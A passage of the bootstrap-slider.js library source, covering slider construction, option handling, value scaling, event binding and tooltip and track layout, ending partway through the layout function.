/*! =========================================================
 * bootstrap-slider.js
 *
 * Maintainers:
 *		Kyle Kemp
 *			- Twitter: @seiyria
 *			- Github:  seiyria
 *		Rohit Kalkur
 *			- Twitter: @Rovolutionary
 *			- Github:  rovolution
 *
 * =========================================================
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 * ========================================================= */


/**
 * Bridget makes jQuery widgets
 * v1.0.1
 * MIT license
 */

(function(root, factory) {
	if(typeof define === "function" && define.amd) {
		define(["jquery"], factory);
	}
	else if(typeof module === "object" && module.exports) {
		var jQuery;
		try {
			jQuery = require("jquery");
		}
		catch (err) {
			jQuery = null;
		}
		module.exports = factory(jQuery);
	}
	else {
		root.Slider = factory(root.jQuery);
	}
}(this, function($) {
	// Reference to Slider constructor
	var Slider;


	(function( $ ) {

		'use strict';

		// -------------------------- utils -------------------------- //

		var slice = Array.prototype.slice;

		function noop() {}

		// -------------------------- definition -------------------------- //

		function defineBridget( $ ) {

			// bail if no jQuery
			if ( !$ ) {
				return;
			}

			// -------------------------- addOptionMethod -------------------------- //

			/**
			 * adds option method -> $().plugin('option', {...})
			 * @param {Function} PluginClass - constructor class
			 */
			function addOptionMethod( PluginClass ) {
				// don't overwrite original option method
				if ( PluginClass.prototype.option ) {
					return;
				}

			  // option setter
			  PluginClass.prototype.option = function( opts ) {
			    // bail out if not an object
			    if ( !$.isPlainObject( opts ) ){
			      return;
			    }
			    this.options = $.extend( true, this.options, opts );
			  };
			}


			// -------------------------- plugin bridge -------------------------- //

			// helper function for logging errors
			// $.error breaks jQuery chaining
			var logError = typeof console === 'undefined' ? noop :
			  function( message ) {
			    console.error( message );
			  };

			/**
			 * jQuery plugin bridge, access methods like $elem.plugin('method')
			 * @param {String} namespace - plugin name
			 * @param {Function} PluginClass - constructor class
			 */
			function bridge( namespace, PluginClass ) {
			  // add to jQuery fn namespace
			  $.fn[ namespace ] = function( options ) {
			    if ( typeof options === 'string' ) {
			      // call plugin method when first argument is a string
			      // get arguments for method
			      var args = slice.call( arguments, 1 );

			      for ( var i=0, len = this.length; i < len; i++ ) {
			        var elem = this[i];
			        var instance = $.data( elem, namespace );
			        if ( !instance ) {
			          logError( "cannot call methods on " + namespace + " prior to initialization; " +
			            "attempted to call '" + options + "'" );
			          continue;
			        }
			        if ( !$.isFunction( instance[options] ) || options.charAt(0) === '_' ) {
			          logError( "no such method '" + options + "' for " + namespace + " instance" );
			          continue;
			        }

			        // trigger method with arguments
			        var returnValue = instance[ options ].apply( instance, args);

			        // break look and return first value if provided
			        if ( returnValue !== undefined && returnValue !== instance) {
			          return returnValue;
			        }
			      }
			      // return this if no return value
			      return this;
			    } else {
			      var objects = this.map( function() {
			        var instance = $.data( this, namespace );
			        if ( instance ) {
			          // apply options & init
			          instance.option( options );
			          instance._init();
			        } else {
			          // initialize new instance
			          instance = new PluginClass( this, options );
			          $.data( this, namespace, instance );
			        }
			        return $(this);
			      });

			      if(!objects || objects.length > 1) {
			      	return objects;
			      } else {
			      	return objects[0];
			      }
			    }
			  };

			}

			// -------------------------- bridget -------------------------- //

			/**
			 * converts a Prototypical class into a proper jQuery plugin
			 *   the class must have a ._init method
			 * @param {String} namespace - plugin name, used in $().pluginName
			 * @param {Function} PluginClass - constructor class
			 */
			$.bridget = function( namespace, PluginClass ) {
			  addOptionMethod( PluginClass );
			  bridge( namespace, PluginClass );
			};

			return $.bridget;

		}

	  	// get jquery from browser global
	  	defineBridget( $ );

	})( $ );


	/*************************************************

			BOOTSTRAP-SLIDER SOURCE CODE

	**************************************************/

	(function($) {

		var ErrorMsgs = {
			formatInvalidInputErrorMsg : function(input) {
				return "Invalid input value '" + input + "' passed in";
			},
			callingContextNotSliderInstance : "Calling context element does not have instance of Slider bound to it. Check your code to make sure the JQuery object returned from the call to the slider() initializer is calling the method"
		};

		var SliderScale = {
			linear: {
				toValue: function(percentage) {
					var rawValue = percentage/100 * (this.options.max - this.options.min);
					if (this.options.ticks_positions.length > 0) {
						var minv, maxv, minp, maxp = 0;
						for (var i = 0; i < this.options.ticks_positions.length; i++) {
							if (percentage <= this.options.ticks_positions[i]) {
								minv = (i > 0) ? this.options.ticks[i-1] : 0;
								minp = (i > 0) ? this.options.ticks_positions[i-1] : 0;
								maxv = this.options.ticks[i];
								maxp = this.options.ticks_positions[i];

								break;
							}
						}
						if (i > 0) {
							var partialPercentage = (percentage - minp) / (maxp - minp);
							rawValue = minv + partialPercentage * (maxv - minv);
						}
					}

					var value = this.options.min + Math.round(rawValue / this.options.step) * this.options.step;
					if (value < this.options.min) {
						return this.options.min;
					} else if (value > this.options.max) {
						return this.options.max;
					} else {
						return value;
					}
				},
				toPercentage: function(value) {
					if (this.options.max === this.options.min) {
						return 0;
					}

					if (this.options.ticks_positions.length > 0) {
						var minv, maxv, minp, maxp = 0;
						for (var i = 0; i < this.options.ticks.length; i++) {
							if (value  <= this.options.ticks[i]) {
								minv = (i > 0) ? this.options.ticks[i-1] : 0;
								minp = (i > 0) ? this.options.ticks_positions[i-1] : 0;
								maxv = this.options.ticks[i];
								maxp = this.options.ticks_positions[i];

								break;
							}
						}
						if (i > 0) {
							var partialPercentage = (value - minv) / (maxv - minv);
							return minp + partialPercentage * (maxp - minp);
						}
					}

					return 100 * (value - this.options.min) / (this.options.max - this.options.min);
				}
			},

			logarithmic: {
				/* Based on http://stackoverflow.com/questions/846221/logarithmic-slider */
				toValue: function(percentage) {
					var min = (this.options.min === 0) ? 0 : Math.log(this.options.min);
					var max = Math.log(this.options.max);
					var value = Math.exp(min + (max - min) * percentage / 100);
					value = this.options.min + Math.round((value - this.options.min) / this.options.step) * this.options.step;
					/* Rounding to the nearest step could exceed the min or
					 * max, so clip to those values. */
					if (value < this.options.min) {
						return this.options.min;
					} else if (value > this.options.max) {
						return this.options.max;
					} else {
						return value;
					}
				},
				toPercentage: function(value) {
					if (this.options.max === this.options.min) {
						return 0;
					} else {
						var max = Math.log(this.options.max);
						var min = this.options.min === 0 ? 0 : Math.log(this.options.min);
						var v = value === 0 ? 0 : Math.log(value);
						return 100 * (v - min) / (max - min);
					}
				}
			}
		};


		/*************************************************

							CONSTRUCTOR

		**************************************************/
		Slider = function(element, options) {
			createNewSlider.call(this, element, options);
			return this;
		};

		function createNewSlider(element, options) {

			/*
				The internal state object is used to store data about the current 'state' of slider.

				This includes values such as the `value`, `enabled`, etc...
			*/
			this._state = {
				value: null,
				enabled: null,
				offset: null,
				size: null,
				percentage: null,
				inDrag: false,
				over: false
			};


			if(typeof element === "string") {
				this.element = document.querySelector(element);
			} else if(element instanceof HTMLElement) {
				this.element = element;
			}

			/*************************************************

							Process Options

			**************************************************/
			options = options ? options : {};
			var optionTypes = Object.keys(this.defaultOptions);

			for(var i = 0; i < optionTypes.length; i++) {
				var optName = optionTypes[i];

				// First check if an option was passed in via the constructor
				var val = options[optName];
				// If no data attrib, then check data atrributes
				val = (typeof val !== 'undefined') ? val : getDataAttrib(this.element, optName);
				// Finally, if nothing was specified, use the defaults
				val = (val !== null) ? val : this.defaultOptions[optName];

				// Set all options on the instance of the Slider
				if(!this.options) {
					this.options = {};
				}
				this.options[optName] = val;
			}

			/*
				Validate `tooltip_position` against 'orientation`
				- if `tooltip_position` is incompatible with orientation, swith it to a default compatible with specified `orientation`
					-- default for "vertical" -> "right"
					-- default for "horizontal" -> "left"
			*/
			if(this.options.orientation === "vertical" && (this.options.tooltip_position === "top" || this.options.tooltip_position === "bottom")) {

				this.options.tooltip_position	= "right";

			}
			else if(this.options.orientation === "horizontal" && (this.options.tooltip_position === "left" || this.options.tooltip_position === "right")) {

				this.options.tooltip_position	= "top";

			}

			function getDataAttrib(element, optName) {
				var dataName = "data-slider-" + optName.replace(/_/g, '-');
				var dataValString = element.getAttribute(dataName);

				try {
					return JSON.parse(dataValString);
				}
				catch(err) {
					return dataValString;
				}
			}

			/*************************************************

							Create Markup

			**************************************************/

			var origWidth = this.element.style.width;
			var updateSlider = false;
			var parent = this.element.parentNode;
			var sliderTrackSelection;
			var sliderTrackLow, sliderTrackHigh;
			var sliderMinHandle;
			var sliderMaxHandle;

			if (this.sliderElem) {
				updateSlider = true;
			} else {
				/* Create elements needed for slider */
				this.sliderElem = document.createElement("div");
				this.sliderElem.className = "slider";

				/* Create slider track elements */
				var sliderTrack = document.createElement("div");
				sliderTrack.className = "slider-track";

				sliderTrackLow = document.createElement("div");
				sliderTrackLow.className = "slider-track-low";

				sliderTrackSelection = document.createElement("div");
				sliderTrackSelection.className = "slider-selection";

				sliderTrackHigh = document.createElement("div");
				sliderTrackHigh.className = "slider-track-high";

				sliderMinHandle = document.createElement("div");
				sliderMinHandle.className = "slider-handle min-slider-handle";
				sliderMinHandle.setAttribute('role', 'slider');
				sliderMinHandle.setAttribute('aria-valuemin', this.options.min);
				sliderMinHandle.setAttribute('aria-valuemax', this.options.max);

				sliderMaxHandle = document.createElement("div");
				sliderMaxHandle.className = "slider-handle max-slider-handle";
				sliderMaxHandle.setAttribute('role', 'slider');
				sliderMaxHandle.setAttribute('aria-valuemin', this.options.min);
				sliderMaxHandle.setAttribute('aria-valuemax', this.options.max);

				sliderTrack.appendChild(sliderTrackLow);
				sliderTrack.appendChild(sliderTrackSelection);
				sliderTrack.appendChild(sliderTrackHigh);

				/* Add aria-labelledby to handle's */
				var isLabelledbyArray = Array.isArray(this.options.labelledby);
				if (isLabelledbyArray && this.options.labelledby[0]) {
					sliderMinHandle.setAttribute('aria-labelledby', this.options.labelledby[0]);
				}
				if (isLabelledbyArray && this.options.labelledby[1]) {
					sliderMaxHandle.setAttribute('aria-labelledby', this.options.labelledby[1]);
				}
				if (!isLabelledbyArray && this.options.labelledby) {
					sliderMinHandle.setAttribute('aria-labelledby', this.options.labelledby);
					sliderMaxHandle.setAttribute('aria-labelledby', this.options.labelledby);
				}

				/* Create ticks */
				this.ticks = [];
				if (Array.isArray(this.options.ticks) && this.options.ticks.length > 0) {
					for (i = 0; i < this.options.ticks.length; i++) {
						var tick = document.createElement('div');
						tick.className = 'slider-tick';

						this.ticks.push(tick);
						sliderTrack.appendChild(tick);
					}

					sliderTrackSelection.className += " tick-slider-selection";
				}

				sliderTrack.appendChild(sliderMinHandle);
				sliderTrack.appendChild(sliderMaxHandle);

				this.tickLabels = [];
				if (Array.isArray(this.options.ticks_labels) && this.options.ticks_labels.length > 0) {
					this.tickLabelContainer = document.createElement('div');
					this.tickLabelContainer.className = 'slider-tick-label-container';

					for (i = 0; i < this.options.ticks_labels.length; i++) {
						var label = document.createElement('div');
						var noTickPositionsSpecified = this.options.ticks_positions.length === 0;
						var tickLabelsIndex = (this.options.reversed && noTickPositionsSpecified) ? (this.options.ticks_labels.length - (i + 1)) : i;
						label.className = 'slider-tick-label';
						label.innerHTML = this.options.ticks_labels[tickLabelsIndex];

						this.tickLabels.push(label);
						this.tickLabelContainer.appendChild(label);
					}
				}


				var createAndAppendTooltipSubElements = function(tooltipElem) {
					var arrow = document.createElement("div");
					arrow.className = "tooltip-arrow";

					var inner = document.createElement("div");
					inner.className = "tooltip-inner";

					tooltipElem.appendChild(arrow);
					tooltipElem.appendChild(inner);

				};

				/* Create tooltip elements */
				var sliderTooltip = document.createElement("div");
				sliderTooltip.className = "tooltip tooltip-main";
				sliderTooltip.setAttribute('role', 'presentation');
				createAndAppendTooltipSubElements(sliderTooltip);

				var sliderTooltipMin = document.createElement("div");
				sliderTooltipMin.className = "tooltip tooltip-min";
				sliderTooltipMin.setAttribute('role', 'presentation');
				createAndAppendTooltipSubElements(sliderTooltipMin);

				var sliderTooltipMax = document.createElement("div");
				sliderTooltipMax.className = "tooltip tooltip-max";
				sliderTooltipMax.setAttribute('role', 'presentation');
				createAndAppendTooltipSubElements(sliderTooltipMax);


				/* Append components to sliderElem */
				this.sliderElem.appendChild(sliderTrack);
				this.sliderElem.appendChild(sliderTooltip);
				this.sliderElem.appendChild(sliderTooltipMin);
				this.sliderElem.appendChild(sliderTooltipMax);

				if (this.tickLabelContainer) {
					this.sliderElem.appendChild(this.tickLabelContainer);
				}

				/* Append slider element to parent container, right before the original <input> element */
				parent.insertBefore(this.sliderElem, this.element);

				/* Hide original <input> element */
				this.element.style.display = "none";
			}
			/* If JQuery exists, cache JQ references */
			if($) {
				this.$element = $(this.element);
				this.$sliderElem = $(this.sliderElem);
			}

			/*************************************************

								Setup

			**************************************************/
			this.eventToCallbackMap = {};
			this.sliderElem.id = this.options.id;

			this.touchCapable = 'ontouchstart' in window || (window.DocumentTouch && document instanceof window.DocumentTouch);

			this.tooltip = this.sliderElem.querySelector('.tooltip-main');
			this.tooltipInner = this.tooltip.querySelector('.tooltip-inner');

			this.tooltip_min = this.sliderElem.querySelector('.tooltip-min');
			this.tooltipInner_min = this.tooltip_min.querySelector('.tooltip-inner');

			this.tooltip_max = this.sliderElem.querySelector('.tooltip-max');
			this.tooltipInner_max= this.tooltip_max.querySelector('.tooltip-inner');

			if (SliderScale[this.options.scale]) {
				this.options.scale = SliderScale[this.options.scale];
			}

			if (updateSlider === true) {
				// Reset classes
				this._removeClass(this.sliderElem, 'slider-horizontal');
				this._removeClass(this.sliderElem, 'slider-vertical');
				this._removeClass(this.tooltip, 'hide');
				this._removeClass(this.tooltip_min, 'hide');
				this._removeClass(this.tooltip_max, 'hide');

				// Undo existing inline styles for track
				["left", "top", "width", "height"].forEach(function(prop) {
					this._removeProperty(this.trackLow, prop);
					this._removeProperty(this.trackSelection, prop);
					this._removeProperty(this.trackHigh, prop);
				}, this);

				// Undo inline styles on handles
				[this.handle1, this.handle2].forEach(function(handle) {
					this._removeProperty(handle, 'left');
					this._removeProperty(handle, 'top');
				}, this);

				// Undo inline styles and classes on tooltips
				[this.tooltip, this.tooltip_min, this.tooltip_max].forEach(function(tooltip) {
					this._removeProperty(tooltip, 'left');
					this._removeProperty(tooltip, 'top');
					this._removeProperty(tooltip, 'margin-left');
					this._removeProperty(tooltip, 'margin-top');

					this._removeClass(tooltip, 'right');
					this._removeClass(tooltip, 'top');
				}, this);
			}

			if(this.options.orientation === 'vertical') {
				this._addClass(this.sliderElem,'slider-vertical');
				this.stylePos = 'top';
				this.mousePos = 'pageY';
				this.sizePos = 'offsetHeight';
			} else {
				this._addClass(this.sliderElem, 'slider-horizontal');
				this.sliderElem.style.width = origWidth;
				this.options.orientation = 'horizontal';
				this.stylePos = 'left';
				this.mousePos = 'pageX';
				this.sizePos = 'offsetWidth';

			}
			this._setTooltipPosition();
			/* In case ticks are specified, overwrite the min and max bounds */
			if (Array.isArray(this.options.ticks) && this.options.ticks.length > 0) {
					this.options.max = Math.max.apply(Math, this.options.ticks);
					this.options.min = Math.min.apply(Math, this.options.ticks);
			}

			if (Array.isArray(this.options.value)) {
				this.options.range = true;
				this._state.value = this.options.value;
			}
			else if (this.options.range) {
				// User wants a range, but value is not an array
				this._state.value = [this.options.value, this.options.max];
			}
			else {
				this._state.value = this.options.value;
			}

			this.trackLow = sliderTrackLow || this.trackLow;
			this.trackSelection = sliderTrackSelection || this.trackSelection;
			this.trackHigh = sliderTrackHigh || this.trackHigh;

			if (this.options.selection === 'none') {
				this._addClass(this.trackLow, 'hide');
				this._addClass(this.trackSelection, 'hide');
				this._addClass(this.trackHigh, 'hide');
			}

			this.handle1 = sliderMinHandle || this.handle1;
			this.handle2 = sliderMaxHandle || this.handle2;

			if (updateSlider === true) {
				// Reset classes
				this._removeClass(this.handle1, 'round triangle');
				this._removeClass(this.handle2, 'round triangle hide');

				for (i = 0; i < this.ticks.length; i++) {
					this._removeClass(this.ticks[i], 'round triangle hide');
				}
			}

			var availableHandleModifiers = ['round', 'triangle', 'custom'];
			var isValidHandleType = availableHandleModifiers.indexOf(this.options.handle) !== -1;
			if (isValidHandleType) {
				this._addClass(this.handle1, this.options.handle);
				this._addClass(this.handle2, this.options.handle);

				for (i = 0; i < this.ticks.length; i++) {
					this._addClass(this.ticks[i], this.options.handle);
				}
			}

			this._state.offset = this._offset(this.sliderElem);
			this._state.size = this.sliderElem[this.sizePos];
			this.setValue(this._state.value);

			/******************************************

						Bind Event Listeners

			******************************************/

			// Bind keyboard handlers
			this.handle1Keydown = this._keydown.bind(this, 0);
			this.handle1.addEventListener("keydown", this.handle1Keydown, false);

			this.handle2Keydown = this._keydown.bind(this, 1);
			this.handle2.addEventListener("keydown", this.handle2Keydown, false);

			this.mousedown = this._mousedown.bind(this);
			if (this.touchCapable) {
				// Bind touch handlers
				this.sliderElem.addEventListener("touchstart", this.mousedown, false);
			}
			this.sliderElem.addEventListener("mousedown", this.mousedown, false);


			// Bind tooltip-related handlers
			if(this.options.tooltip === 'hide') {
				this._addClass(this.tooltip, 'hide');
				this._addClass(this.tooltip_min, 'hide');
				this._addClass(this.tooltip_max, 'hide');
			}
			else if(this.options.tooltip === 'always') {
				this._showTooltip();
				this._alwaysShowTooltip = true;
			}
			else {
				this.showTooltip = this._showTooltip.bind(this);
				this.hideTooltip = this._hideTooltip.bind(this);

				this.sliderElem.addEventListener("mouseenter", this.showTooltip, false);
				this.sliderElem.addEventListener("mouseleave", this.hideTooltip, false);

				this.handle1.addEventListener("focus", this.showTooltip, false);
				this.handle1.addEventListener("blur", this.hideTooltip, false);

				this.handle2.addEventListener("focus", this.showTooltip, false);
				this.handle2.addEventListener("blur", this.hideTooltip, false);
			}

			if(this.options.enabled) {
				this.enable();
			} else {
				this.disable();
			}
		}



		/*************************************************

					INSTANCE PROPERTIES/METHODS

		- Any methods bound to the prototype are considered
		part of the plugin's `public` interface

		**************************************************/
		Slider.prototype = {
			_init: function() {}, // NOTE: Must exist to support bridget

			constructor: Slider,

			defaultOptions: {
				id: "",
			  min: 0,
				max: 10,
				step: 1,
				precision: 0,
				orientation: 'horizontal',
				value: 5,
				range: false,
				selection: 'before',
				tooltip: 'show',
				tooltip_split: false,
				handle: 'round',
				reversed: false,
				enabled: true,
				formatter: function(val) {
					if (Array.isArray(val)) {
						return val[0] + " : " + val[1];
					} else {
						return val;
					}
				},
				natural_arrow_keys: false,
				ticks: [],
				ticks_positions: [],
				ticks_labels: [],
				ticks_snap_bounds: 0,
				scale: 'linear',
				focus: false,
				tooltip_position: null,
				labelledby: null
			},

			getElement: function() {
				return this.sliderElem;
			},

			getValue: function() {
				if (this.options.range) {
					return this._state.value;
				}
				else {
					return this._state.value[0];
				}
			},

			setValue: function(val, triggerSlideEvent, triggerChangeEvent) {
				if (!val) {
					val = 0;
				}
				var oldValue = this.getValue();
				this._state.value = this._validateInputValue(val);
				var applyPrecision = this._applyPrecision.bind(this);

				if (this.options.range) {
					this._state.value[0] = applyPrecision(this._state.value[0]);
					this._state.value[1] = applyPrecision(this._state.value[1]);

					this._state.value[0] = Math.max(this.options.min, Math.min(this.options.max, this._state.value[0]));
					this._state.value[1] = Math.max(this.options.min, Math.min(this.options.max, this._state.value[1]));
				}
				else {
					this._state.value = applyPrecision(this._state.value);
					this._state.value = [ Math.max(this.options.min, Math.min(this.options.max, this._state.value))];
					this._addClass(this.handle2, 'hide');
					if (this.options.selection === 'after') {
						this._state.value[1] = this.options.max;
					} else {
						this._state.value[1] = this.options.min;
					}
				}

				if (this.options.max > this.options.min) {
					this._state.percentage = [
						this._toPercentage(this._state.value[0]),
						this._toPercentage(this._state.value[1]),
						this.options.step * 100 / (this.options.max - this.options.min)
					];
				} else {
					this._state.percentage = [0, 0, 100];
				}

				this._layout();
				var newValue = this.options.range ? this._state.value : this._state.value[0];

				if(triggerSlideEvent === true) {
					this._trigger('slide', newValue);
				}
				if( (oldValue !== newValue) && (triggerChangeEvent === true) ) {
					this._trigger('change', {
						oldValue: oldValue,
						newValue: newValue
					});
				}
				this._setDataVal(newValue);

				return this;
			},

			destroy: function(){
				// Remove event handlers on slider elements
				this._removeSliderEventHandlers();

				// Remove the slider from the DOM
				this.sliderElem.parentNode.removeChild(this.sliderElem);
				/* Show original <input> element */
				this.element.style.display = "";

				// Clear out custom event bindings
				this._cleanUpEventCallbacksMap();

				// Remove data values
				this.element.removeAttribute("data");

				// Remove JQuery handlers/data
				if($) {
					this._unbindJQueryEventHandlers();
					this.$element.removeData('slider');
				}
			},

			disable: function() {
				this._state.enabled = false;
				this.handle1.removeAttribute("tabindex");
				this.handle2.removeAttribute("tabindex");
				this._addClass(this.sliderElem, 'slider-disabled');
				this._trigger('slideDisabled');

				return this;
			},

			enable: function() {
				this._state.enabled = true;
				this.handle1.setAttribute("tabindex", 0);
				this.handle2.setAttribute("tabindex", 0);
				this._removeClass(this.sliderElem, 'slider-disabled');
				this._trigger('slideEnabled');

				return this;
			},

			toggle: function() {
				if(this._state.enabled) {
					this.disable();
				} else {
					this.enable();
				}
				return this;
			},

			isEnabled: function() {
				return this._state.enabled;
			},

			on: function(evt, callback) {
				this._bindNonQueryEventHandler(evt, callback);
				return this;
			},

      off: function(evt, callback) {
          if($) {
              this.$element.off(evt, callback);
              this.$sliderElem.off(evt, callback);
          } else {
              this._unbindNonQueryEventHandler(evt, callback);
          }
      },

			getAttribute: function(attribute) {
				if(attribute) {
					return this.options[attribute];
				} else {
					return this.options;
				}
			},

			setAttribute: function(attribute, value) {
				this.options[attribute] = value;
				return this;
			},

			refresh: function() {
				this._removeSliderEventHandlers();
				createNewSlider.call(this, this.element, this.options);
				if($) {
					// Bind new instance of slider to the element
					$.data(this.element, 'slider', this);
				}
				return this;
			},

			relayout: function() {
				this._layout();
				return this;
			},

			/******************************+

						HELPERS

			- Any method that is not part of the public interface.
			- Place it underneath this comment block and write its signature like so:

			  					_fnName : function() {...}

			********************************/
			_removeSliderEventHandlers: function() {
				// Remove keydown event listeners
				this.handle1.removeEventListener("keydown", this.handle1Keydown, false);
				this.handle2.removeEventListener("keydown", this.handle2Keydown, false);

				if (this.showTooltip) {
					this.handle1.removeEventListener("focus", this.showTooltip, false);
					this.handle2.removeEventListener("focus", this.showTooltip, false);
				}
				if (this.hideTooltip) {
					this.handle1.removeEventListener("blur", this.hideTooltip, false);
					this.handle2.removeEventListener("blur", this.hideTooltip, false);
				}

				// Remove event listeners from sliderElem
				if (this.showTooltip) {
					this.sliderElem.removeEventListener("mouseenter", this.showTooltip, false);
				}
				if (this.hideTooltip) {
					this.sliderElem.removeEventListener("mouseleave", this.hideTooltip, false);
				}
				this.sliderElem.removeEventListener("touchstart", this.mousedown, false);
				this.sliderElem.removeEventListener("mousedown", this.mousedown, false);
			},
			_bindNonQueryEventHandler: function(evt, callback) {
				if(this.eventToCallbackMap[evt] === undefined) {
					this.eventToCallbackMap[evt] = [];
				}
				this.eventToCallbackMap[evt].push(callback);
			},
      _unbindNonQueryEventHandler: function(evt, callback) {
          var callbacks = this.eventToCallbackMap[evt];
          if(callbacks !== undefined) {
              for (var i = 0; i < callbacks.length; i++) {
                  if (callbacks[i] === callback) {
                      callbacks.splice(i, 1);
                      break;
                  }
              }
          }
      },
			_cleanUpEventCallbacksMap: function() {
				var eventNames = Object.keys(this.eventToCallbackMap);
				for(var i = 0; i < eventNames.length; i++) {
					var eventName = eventNames[i];
					this.eventToCallbackMap[eventName] = null;
				}
			},
			_showTooltip: function() {
				if (this.options.tooltip_split === false ){
        	this._addClass(this.tooltip, 'in');
        	this.tooltip_min.style.display = 'none';
        	this.tooltip_max.style.display = 'none';
		    } else {
          this._addClass(this.tooltip_min, 'in');
          this._addClass(this.tooltip_max, 'in');
          this.tooltip.style.display = 'none';
		    }
				this._state.over = true;
			},
			_hideTooltip: function() {
				if (this._state.inDrag === false && this.alwaysShowTooltip !== true) {
					this._removeClass(this.tooltip, 'in');
					this._removeClass(this.tooltip_min, 'in');
					this._removeClass(this.tooltip_max, 'in');
				}
				this._state.over = false;
			},
			_layout: function() {
				var positionPercentages;

				if(this.options.reversed) {
					positionPercentages = [ 100 - this._state.percentage[0], this.options.range ? 100 - this._state.percentage[1] : this._state.percentage[1]];
				}
				else {
					positionPercentages = [ this._state.percentage[0], this._state.percentage[1] ];
				}

				this.handle1.style[this.stylePos] = positionPercentages[0]+'%';
				this.handle1.setAttribute('aria-valuenow', this._state.value[0]);

				this.handle2.style[this.stylePos] = positionPercentages[1]+'%';
				this.handle2.setAttribute('aria-valuenow', this._state.value[1]);

				/* Position ticks and labels */
				if (Array.isArray(this.options.ticks) && this.options.ticks.length > 0) {

					var styleSize = this.options.orientation === 'vertical' ? 'height' : 'width';
					var styleMargin = this.options.orientation === 'vertical' ? 'marginTop' : 'marginLeft';
					var labelSize = this._state.size / (this.options.ticks.length - 1);

					if (this.tickLabelContainer) {
						var extraMargin = 0;
						if (this.options.ticks_positions.length === 0) {
							if (this.options.orientation !== 'vertical') {
								this.tickLabelContainer.style[styleMargin] = -labelSize/2 + 'px';
							}

							extraMargin = this.tickLabelContainer.offsetHeight;
						} else {
							/* Chidren are position absolute, calculate height by finding the max offsetHeight of a child */
							for (i = 0 ; i < this.tickLabelContainer.childNodes.length; i++) {
								if (this.tickLabelContainer.childNodes[i].offsetHeight > extraMargin) {
									extraMargin = this.tickLabelContainer.childNodes[i].offsetHeight;
								}
							}
						}
						if (this.options.orientation === 'horizontal') {
							this.sliderElem.style.marginBottom = extraMargin + 'px';
						}
					}
					for (var i = 0; i < this.options.ticks.length; i++) {

						var percentage = this.options.ticks_positions[i] || this._toPercentage(this.options.ticks[i]);

						if (this.options.reversed) {
							percentage = 100 - percentage;
						}

						this.ticks[i].style[this.stylePos] = percentage + '%';

						/* Set class labels to denote whether ticks are in the selection */
						this._removeClass(this.ticks[i], 'in-selection');
						if (!this.options.range) {
							if (this.options.selection === 'after' && percentage >= positionPercentages[0]){
								this._addClass(this.ticks[i], 'in-selection');
							} else if (this.options.selection === 'before' && percentage <= positionPercentages[0]) {
								this._addClass(this.ticks[i], 'in-selection');
							}
						} else if (percentage >= positionPercentages[0] && percentage <= positionPercentages[1]) {
							this._addClass(this.ticks[i], 'in-selection');
						}

						if (this.tickLabels[i]) {
							this.tickLabels[i].style[styleSize] = labelSize + 'px';

							if (this.options.orientation !== 'vertical' && this.options.ticks_positions[i] !== undefined) {
								this.tickLabels[i].style.position = 'absolute';
								this.tickLabels[i].style[this.stylePos] = percentage + '%';
								this.tickLabels[i].style[styleMargin] = -labelSize/2 + 'px';
							} else if (this.options.orientation === 'vertical') {
								this.tickLabels[i].style['marginLeft'] =  this.sliderElem.offsetWidth + 'px';
								this.tickLabelContainer.style['marginTop'] = this.sliderElem.offsetWidth / 2 * -1 + 'px';
							}
						}
					}
				}

				var formattedTooltipVal;

				if (this.options.range) {
					formattedTooltipVal = this.options.formatter(this._state.value);
					this._setText(this.tooltipInner, formattedTooltipVal);
					this.tooltip.style[this.stylePos] = (positionPercentages[1] + positionPercentages[0])/2 + '%';

					if (this.options.orientation === 'vertical') {
						this._css(this.tooltip, 'margin-top', -this.tooltip.offsetHeight / 2 + 'px');
					} else {
						this._css(this.tooltip, 'margin-left', -this.tooltip.offsetWidth / 2 + 'px');
					}

					if (this.options.orientation === 'vertical') {
						this._css(this.tooltip, 'margin-top', -this.tooltip.offsetHeight / 2 + 'px');
					} else {
						this._css(this.tooltip, 'margin-left', -this.tooltip.offsetWidth / 2 + 'px');
					}

					var innerTooltipMinText = this.options.formatter(this._state.value[0]);
					this._setText(this.tooltipInner_min, innerTooltipMinText);

					var innerTooltipMaxText = this.options.formatter(this._state.value[1]);
					this._setText(this.tooltipInner_max, innerTooltipMaxText);

					this.tooltip_min.style[this.stylePos] = positionPercentages[0] + '%';

					if (this.options.orientation === 'vertical') {
						this._css(this.tooltip_min, 'margin-top', -this.tooltip_min.offsetHeight / 2 + 'px');
					} else {
						this._css(this.tooltip_min, 'margin-left', -this.tooltip_min.offsetWidth / 2 + 'px');
					}

					this.tooltip_max.style[this.stylePos] = positionPercentages[1] + '%';

					if (this.options.orientation === 'vertical') {
						this._css(this.tooltip_max, 'margin-top', -this.tooltip_max.offsetHeight / 2 + 'px');
					} else {
						this._css(this.tooltip_max, 'margin-left', -this.tooltip_max.offsetWidth / 2 + 'px');
					}
				} else {
					formattedTooltipVal = this.options.formatter(this._state.value[0]);
					this._setText(this.tooltipInner, formattedTooltipVal);

					this.tooltip.style[this.stylePos] = positionPercentages[0] + '%';
					if (this.options.orientation === 'vertical') {
						this._css(this.tooltip, 'margin-top', -this.tooltip.offsetHeight / 2 + 'px');
					} else {
						this._css(this.tooltip, 'margin-left', -this.tooltip.offsetWidth / 2 + 'px');
					}
				}

				if (this.options.orientation === 'vertical') {
					this.trackLow.style.top = '0';
					this.trackLow.style.height = Math.min(positionPercentages[0], positionPercentages[1]) +'%';

					this.trackSelection.style.top = Math.min(positionPercentages[0], positionPercentages[1]) +'%';
					this.trackSelection.style.height = Math.abs(positionPercentages[0] - positionPercentages[1]) +'%';

					this.trackHigh.style.bottom = '0';
					this.trackHigh.style.height = (100 - Math.min(positionPercentages[0], positionPercentages[1]) - Math.abs(positionPercentages[0] - positionPercentages[1])) +'%';
				}
				else {
					this.trackLow.style.left = '0';
					this.trackLow.style.width = Math.min(positionPercentages[0], positionPercentages[1]) +'%';

					this.trackSelection.style.left = Math.min(positionPercentages[0], positionPercentages[1]) +'%';
					this.trackSelection.style.width = Math.abs(positionPercentages[0] - positionPercentages[1]) +'%';

					this.trackHigh.style.right = '0';
					this.trackHigh.style.width = (100 - Math.min(positionPercentages[0], positionPercentages[1]) - Math.abs(positionPercentages[0] - positionPercentages[1])) +'%';

			        var offset_min = this.tooltip_min.getBoundingClientRect();
